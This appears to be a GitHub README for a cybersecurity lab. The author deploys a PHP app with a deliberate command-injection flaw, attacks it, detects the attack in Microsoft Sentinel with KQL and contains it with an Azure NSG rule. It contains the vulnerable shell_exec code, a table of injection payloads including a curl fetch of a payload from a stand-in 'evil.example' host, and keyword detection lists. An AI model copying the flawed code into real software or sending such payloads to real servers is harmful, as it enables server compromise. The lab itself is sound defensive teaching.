<div align="center">

# 🔴 Vulnerable Web Server Lab – RCE Exploitation, Detection & Incident Response

### Command Injection · Apache Log Ingestion · Microsoft Sentinel · KQL · NSG Containment

![Domain](https://img.shields.io/badge/Type-Offensive%20%2B%20Defensive%20Security%20Lab-red?style=for-the-badge)
![SIEM](https://img.shields.io/badge/SIEM-Microsoft%20Sentinel-blue?style=for-the-badge)
![Attack](https://img.shields.io/badge/Vulnerability-RCE%20%2F%20CWE--78-critical?style=for-the-badge)

<img src="https://img.shields.io/badge/Attack%20Stages-7%20Stage%20Kill%20Chain-red?style=flat-square" />
<img src="https://img.shields.io/badge/Real%20Attacker-103.168.66.101%20%E2%80%94%2082%20Events-critical?style=flat-square" />
<img src="https://img.shields.io/badge/Detection-KQL%20Analytics%20Rule-blue?style=flat-square" />
<img src="https://img.shields.io/badge/MITRE-8%20Techniques%20Mapped-orange?style=flat-square" />
<img src="https://img.shields.io/badge/Containment-NSG%20Deny%20Rule-brightgreen?style=flat-square" />

---

**Prepared by:** Bikash Raya
**Project Type:** Full Offensive-to-Defensive Lab — RCE Exploitation, Log Ingestion, Detection, Investigation & NSG Containment

</div>

---

## 📁 Repository Structure

| File | Description |
| --- | --- |
| [Vulnerable_WebServer_RCE_Detection_IR_Lab_Report.docx](./Vulnerable_WebServer_RCE_Detection_IR_Lab_Report.docx) | Complete lab report with all screenshots and full source code embedded |
| README.md | Project overview |

---

## 📋 Overview

In this lab I built a deliberately vulnerable web application, attacked it using a 7-stage kill chain, ingested Apache logs into Microsoft Sentinel, detected the attack with KQL, investigated the incident, and contained it by blocking the attacker at the network layer.

I deployed a PHP web application with an intentional command injection flaw (CWE-78). After running my own 7-stage attack I left the VM exposed to the internet. Within a few days real-world threat actor 103.168.66.101 found and exploited the same vulnerability — generating 82 correlated High-severity events in Sentinel that I investigated and contained.

**What I did:**

* 🏗️ Deployed a vulnerable PHP web app (`shell_exec()` — CWE-78) on Ubuntu + Apache2 in Azure — intentionally left unsanitized
* ⚔️ Executed a **7-stage attack chain** — recon → RCE → host discovery → user enumeration → process discovery → network discovery → payload retrieval
* 📡 Ingested Apache access logs into Microsoft Sentinel via **Custom Logs AMA** connector
* 🔍 Detected attack commands using **KQL** against the `ApacheHTTPServer_CL` table
* 🚨 Created a **scheduled High-severity analytics rule** mapped to MITRE ATT&CK
* 🌐 Left VM exposed — real attacker **103.168.66.101** independently found and exploited it → **82 correlated Sentinel events** I had to investigate
* 🔎 Investigated with **3 KQL queries** — attack classification, IP identification, timeline reconstruction
* 🛡️ Contained the attack with a **real NSG Deny rule** blocking the attacker IP on port 80

---

## 🛠️ Technologies Used

* Microsoft Azure (VM · NSG · Resource Group)
* Ubuntu Server 24.04 LTS
* Apache2 + PHP + libapache2-mod-php
* Microsoft Sentinel + Microsoft Defender XDR
* Log Analytics Workspace (VulnLab-LAW)
* Custom Logs via AMA (Data Connector)
* KQL (Kusto Query Language)
* Azure NSG (Network Security Groups)
* MITRE ATT&CK Framework

---

## 🧪 Lab Environment

| Component | Value |
| --- | --- |
| Resource Group | Vuln-Web-Lab (Australia East) |
| VM | VulnWeb-VM — Ubuntu Server 24.04 LTS x64 |
| Public IP | 20.5.176.148 |
| Web Server | Apache2 + PHP + libapache2-mod-php |
| Vulnerable Endpoint | `/internal/index.php` — `shell_exec()` — no input sanitization |
| NSG Rule | Port 80 open to internet (intentional) |
| Log Analytics Workspace | VulnLab-LAW |
| Data Connector | Custom Logs via AMA |
| Sentinel Table | `ApacheHTTPServer_CL` |
| Real Attacker IP | 103.168.66.101 |

---

## 🌐 Lab Architecture

```
[Internet — Attacker]
  Local (7-stage attack) + Real attacker 103.168.66.101
           │
           │  HTTP GET /internal/index.php?search=;whoami
           │  Port 80 — NSG Any/Any/Allow (intentional)
           ▼
[VulnWeb-VM — Ubuntu 24.04]
  Apache2 + PHP
  /internal/index.php — shell_exec($input) — NO SANITIZATION
  /var/log/apache2/access.log — all requests including attack commands logged
           │
           │  Custom Logs via AMA + Data Collection Rule
           ▼
[VulnLab-LAW — Log Analytics Workspace]
  Table: ApacheHTTPServer_CL
           │
           ▼
[Microsoft Sentinel]
  KQL Detection → High-Severity Analytics Rule
  → Incident Generated (82 correlated events)
  → 3 KQL Investigation Queries
  → Attack Classified, IP Identified, Timeline Reconstructed
           │
           ▼
[Azure NSG — Block-Malicious-IP-RCE]
  Deny 103.168.66.101 on Port 80 → Attack Contained ✅
```

---

## ⚠️ The Vulnerability — CWE-78 Command Injection

I deployed a tool called the "Internal File Search Tool" with an intentional command injection flaw. I concatenated user input directly into a shell command with zero sanitization — this is the vulnerability.

```php
<?php

$result = "";
$error  = "";

if(isset($_GET['search'])) {
    $input = $_GET['search'];

    // INTENTIONALLY VULNERABLE — CWE-78
    $command = "ls " . $input;        // user input concatenated directly into OS command
    $result  = shell_exec($command);   // arbitrary OS command executed on the server
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>File Search Utility</title>
    <style>
        body { background:#0f172a; font-family:Arial,sans-serif; color:white;
               display:flex; justify-content:center; align-items:center; height:100vh; }
        .container { background:#1e293b; padding:40px; border-radius:12px;
                     width:600px; box-shadow:0 0 25px rgba(0,0,0,0.6); }
        h1 { text-align:center; margin-bottom:30px; }
        input[type="text"] { width:100%; padding:12px; border-radius:6px;
                             border:none; margin-bottom:15px; font-size:16px; }
        button { width:100%; padding:12px; border:none; border-radius:6px;
                 background:#3b82f6; color:white; font-size:16px; cursor:pointer; }
        button:hover { background:#2563eb; }
        .output { background:black; padding:15px; margin-top:20px;
                  border-radius:6px; max-height:250px; overflow-y:auto;
                  font-family:monospace; }
        .footer { margin-top:15px; font-size:12px; text-align:center; color:#94a3b8; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Internal File Search Tool</h1>
        <form method="GET">
            <input type="text" name="search" placeholder="Enter directory (e.g. /var/www)">
            <button type="submit">Search</button>
        </form>
        <?php if($result): ?>
        <div class="output">
            <pre><?php echo $result; ?></pre>
        </div>
        <?php endif; ?>
        <div class="footer">Internal DevOps Utility v1.0</div>
    </div>
</body>
</html>
```

> **Why it works:** Appending `;` breaks out of the intended `ls` command. `?search=;whoami` becomes `ls ;whoami` — both commands run and the server returns the output in the browser.

**Saved to:** `/var/www/html/internal/index.php`

---

## ⚔️ 7-Stage Attack Chain

I executed each stage manually from a browser — no special tools needed, just crafted URLs. Each stage builds on the last, exactly how a real attacker progresses.

| Stage | MITRE | Command | What it reveals |
|-------|-------|---------|-----------------|
| 1 — Reconnaissance | T1590 | URL enumeration `/admin` `/dev` `/internal` | Hidden internal application discovered |
| 2 — Initial Access (RCE) | T1190 | `?search=;whoami` | RCE confirmed — server runs as `www-data` |
| 3 — Host Discovery | T1082 | `?search=;uname -a` | OS version and kernel identified |
| 4 — User Enumeration | T1087 | `?search=;cat /etc/passwd` | All system user accounts listed |
| 5 — Process Discovery | T1057 | `?search=;ps aux` | Running processes and services identified |
| 6 — Network Discovery | T1046 | `?search=;ss -tulnp` | Listening ports and services identified |
| 7 — Payload Retrieval | T1105 | `?search=;curl http://evil.example/payload.sh` | Simulated C2 payload download |

---

## 📡 Apache Log Ingestion into Sentinel

Apache logged every HTTP request I made — including the injected commands in the URL parameters. By streaming this file into Sentinel, every `;whoami` and `;cat /etc/passwd` became searchable with KQL.

| Setting | Value |
| --- | --- |
| Connector | Custom Logs via AMA |
| Log File | `/var/log/apache2/access.log` |
| DCR Name | ApacheHTTPServer |
| Sentinel Table | `ApacheHTTPServer_CL` |

---

## 🔍 KQL Detection

My detection approach was to search the raw Apache log entries for known attack keywords. When I injected `;whoami` into the URL, that string appeared verbatim in the access log — a simple `has_any()` query surfaces every attack request instantly.

```kql
ApacheHTTPServer_CL
| where RawData has_any (
    "whoami", "hostname", "uname",
    "/etc/passwd", "ps", "ss",
    "curl", "payload.sh"
)
| project TimeGenerated, RawData
| order by TimeGenerated desc
```

---

## 🚨 Scheduled Analytics Rule

| Setting | Value |
| --- | --- |
| Rule Name | Linux Web Application Command Injection Detection |
| Alert Name | Possible Linux Web Application RCE Attempt |
| Severity | 🔴 **High** |
| Run Every | 5 minutes |
| Lookback | 10 minutes |
| Threshold | Results > 0 |
| Alert Grouping | 24-hour window — consolidates repeated alerts from the same attacker into one incident |
| MITRE Tactics | Initial Access · Execution · Discovery · C2 |
| MITRE Techniques | T1190 · T1059 · T1082 · T1087 · T1105 |

---

## 🔎 Incident Investigation — 3 KQL Queries

**My incident:** 🔴 High severity | 82 correlated events | Source IP: 103.168.66.101

### Query 1 — Classify the Attack Activity

*I used this to understand what the attacker was actually doing — labels each log entry with a readable action type.*

```kql
ApacheHTTPServer_CL
| extend IP = tostring(split(RawData, " ")[0])
| extend Action = case(
    RawData has "whoami",          "RCE Attempt",
    RawData has "uname",           "System Recon",
    RawData has "cat /etc/passwd", "Credential Access Attempt",
    RawData has "curl",            "External Connection Attempt",
    "Other")
| project TimeGenerated, IP, Action, RawData
| order by TimeGenerated asc
```

### Query 2 — Identify the Attacker IP

*I used this to confirm which IP was responsible — high count from a single IP means automated or targeted exploitation.*

```kql
ApacheHTTPServer_CL
| extend IP = tostring(split(RawData, " ")[0])
| summarize AttackCount = count() by IP
| order by AttackCount desc
```
✅ **103.168.66.101** confirmed as the top attacker — the volume and pattern pointed to automated tooling.

### Query 3 — Reconstruct the Attack Timeline

*I used this to see how the attack progressed — binning into 5-minute windows showed the escalation pattern clearly.*

```kql
ApacheHTTPServer_CL
| extend IP = tostring(split(RawData, " ")[0])
| summarize count() by bin(TimeGenerated, 5m), IP
| order by TimeGenerated asc
```
✅ I could clearly see the attack moving from initial probing to escalating command execution — consistent with automated tooling.

---

## 🛡️ Containment — NSG Deny Rule

Rather than taking the server offline I created a targeted NSG Deny rule blocking only the attacker IP on port 80 — stopping the attack without impacting legitimate users.

| Field | Value |
| --- | --- |
| Rule Name | Block-Malicious-IP-RCE |
| Source IP | 103.168.66.101 |
| Destination Port | 80 |
| Action | **Deny** |
| Priority | 101 |

**Post-block verification:**
```kql
ApacheHTTPServer_CL
| where RawData has "103.168.66.101"
| order by TimeGenerated desc
```
✅ After applying the NSG rule the KQL query returned no further requests from that IP — containment confirmed.

---

## 🎯 MITRE ATT&CK Techniques

| Technique | Name | Tactic |
|-----------|------|--------|
| T1190 | Exploit Public-Facing Application | Initial Access |
| T1059 | Command & Scripting Interpreter | Execution |
| T1082 | System Information Discovery | Discovery |
| T1033 | System Owner/User Discovery | Discovery |
| T1087 | Account Discovery | Discovery |
| T1057 | Process Discovery | Discovery |
| T1046 | Network Service Discovery | Discovery |
| T1105 | Ingress Tool Transfer | Command & Control |

---

## 🎯 Skills Demonstrated

* Vulnerable Web Application Deployment (PHP Command Injection — CWE-78)
* 7-Stage Offensive Attack Chain Execution
* Apache Log Ingestion into Sentinel (Custom Logs via AMA + DCR)
* KQL Threat Detection (has_any, extend, case, summarize, bin)
* Scheduled Analytics Rule Creation (High severity, MITRE mapped)
* Real Incident Investigation (3 KQL queries)
* Attack Timeline Reconstruction
* MITRE ATT&CK Mapping (8 techniques)
* NSG-Based Network Containment (real Deny rule)
* Microsoft Sentinel + Defender XDR Unified Portal
* Linux CLI & Azure VM Administration

---

## 🎯 Key Takeaway

> I built a vulnerable PHP app, attacked it with a 7-stage kill chain, set up Sentinel to detect it, and then a real attacker (103.168.66.101) showed up and exploited the same vulnerability — generating 82 real events that I had to investigate and contain. Going through this end-to-end gave me hands-on experience with the full SOC workflow: detection, investigation, containment, eradication recommendation, recovery planning, and post-incident review.

---

## 🔗 Related Projects

> Part of the **Bikash Security Lab** series:
> * [Microsoft Sentinel & Defender XDR — SOC IR Lab](https://github.com/Bikash-Raya/Sentinel-Defender-XDR-SOC-Incident-Response-lab)
> * [Microsoft Sentinel — GeoIP Watchlist & Attack Map](https://github.com/Bikash-Raya/microsoft-sentinel-geoip-watchlist-attack-map)
> * [LummaC2 Threat Hunting — Sentinel & Sysmon](https://github.com/Bikash-Raya/Threat-Hunting-Lab-Sentinel-Sysmon--lummac2-)

---

## 🔗 Connect With Me

<div align="center">

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/bikash-raya/)
[![GitHub](https://img.shields.io/badge/GitHub-Follow-black?style=for-the-badge&logo=github)](https://github.com/Bikash-Raya)

</div>

---

<div align="center">

⭐ If you find this project useful, feel free to star the repository ⭐

</div>

---

## 🔧 Eradication

After containment I documented the root cause and recommended fix, and raised a ticket to the development team. My role was identification and containment — the dev team deploys the code fix.

> **Note:** I contained the attack at the network layer. The code fix goes to the development team — I raised the ticket with the full vulnerability details and recommended remediation below.

### Root Cause

The `/internal/index.php` endpoint passes user input directly to `shell_exec()` with no sanitization (CWE-78 / OWASP A03:2021 — Injection). Any attacker who discovers this endpoint can execute arbitrary OS commands as the Apache web server process (`www-data`).

### Recommended Fix — Provided to Development Team

```php
<?php

$result = "";
$error  = "";

if(isset($_GET["search"])) {
    $input = $_GET["search"];

    // SECURE VERSION -- escapeshellarg() neutralizes command injection
    // Wraps input in single quotes and escapes special characters
    // so user input can never break out of the intended ls command
    $safe_input = escapeshellarg($input);

    // Additional safeguard -- only allow alphanumeric and safe path chars
    if(!preg_match("/^[a-zA-Z0-9\/._-]+$/", $input)) {
        $error = "Invalid input. Only alphanumeric characters and paths are allowed.";
    } else {
        $result = shell_exec("ls " . $safe_input);
    }
}
?>
```

**Additional recommendations I included in the ticket:**
- Move `/internal/` behind authentication — never expose internal tools publicly
- Consider replacing `shell_exec()` with PHP native functions (`scandir()`, `glob()`) that do not invoke OS commands
- Deploy a Web Application Firewall (WAF) to block injection patterns at the network layer
- Restrict `/internal/` to trusted IP ranges via Apache access controls

---

## ♻️ Recovery

Recovery depends on the dev team deploying the fix. Until then I am keeping the NSG Deny rule as an interim control.

**Recovery checklist:**
- Confirm patched `index.php` is deployed to `/var/www/html/internal/`
- Verify the fix — test `;whoami` injection — should return an error, not command output
- Run post-recovery KQL query to confirm no further attack traffic
- Monitor `ApacheHTTPServer_CL` for 24-48 hours post-recovery

**Post-recovery verification query:**
```kql
ApacheHTTPServer_CL
| where RawData has "103.168.66.101"
    or RawData has_any ("whoami","passwd","uname","curl","payload")
| project TimeGenerated, RawData
| order by TimeGenerated desc
```
✅ If no new entries appear after the containment timestamp — recovery confirmed. Any entries after that mean the attacker found another path and I need to re-investigate.

---

## 📝 Post-Incident Review

### What I Found
- The `/internal/` endpoint had no authentication and was publicly reachable — I should have added access controls from the start
- Apache logs alone gave me everything I needed to reconstruct the full attack — no additional tooling required
- My analytics rule triggered within 5 minutes of the first attack — the detection timing worked well
- The 24-hour alert grouping turned 82 separate alerts into 1 incident — much easier to work with
- The real-world attacker showed up within days — confirmed that any exposed vulnerable endpoint gets found and exploited quickly

### What I Would Do Differently
- Deploy a WAF to block injection patterns before they reach the application
- Add authentication to `/internal/` from day one — it should never have been publicly accessible
- Run automated vulnerability scanning (e.g. Nessus) before exposing any app — would have caught this immediately
- Avoid `shell_exec()` and use PHP native functions like `scandir()` instead — same result, no OS command risk
- Keep the NSG block on 103.168.66.101 permanently — no reason to ever let that IP back in
